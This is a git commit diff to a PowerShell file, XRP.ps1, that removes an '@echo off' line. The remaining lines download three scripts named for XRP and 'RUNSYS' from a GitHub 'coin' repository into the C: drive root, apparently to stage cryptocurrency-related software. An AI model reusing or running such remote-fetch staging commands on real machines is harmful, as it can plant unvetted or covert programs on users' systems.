2e55f8c4e6edfa860f1a76d80a11a85766af49e4
GALVINVN <112307302+GALVINVN@users.noreply.github.com>
2025-01-10 10:37:16 +0700

    XRP.ps1

--- XRP.ps1
+++ XRP.ps1
@@ -1,4 +1,3 @@
-@echo off
 powershell -NoProfile -Command "Invoke-WebRequest -Uri 'https://raw.githubusercontent.com/GALVINVN/coin/refs/heads/main/XRPSETUP.ps1' -OutFile 'C:\XRPSETUP.ps1'"
 powershell -NoProfile -Command "Invoke-WebRequest -Uri 'https://raw.githubusercontent.com/GALVINVN/coin/refs/heads/main/RUNSYS_XRP.bat' -OutFile 'C:\RUNSYS_XRP.bat'"
 powershell -NoProfile -Command "Invoke-WebRequest -Uri 'https://raw.githubusercontent.com/GALVINVN/coin/refs/heads/main/RUNSYS_XRP.vbs' -OutFile 'C:\RUNSYS_XRP.vbs'"
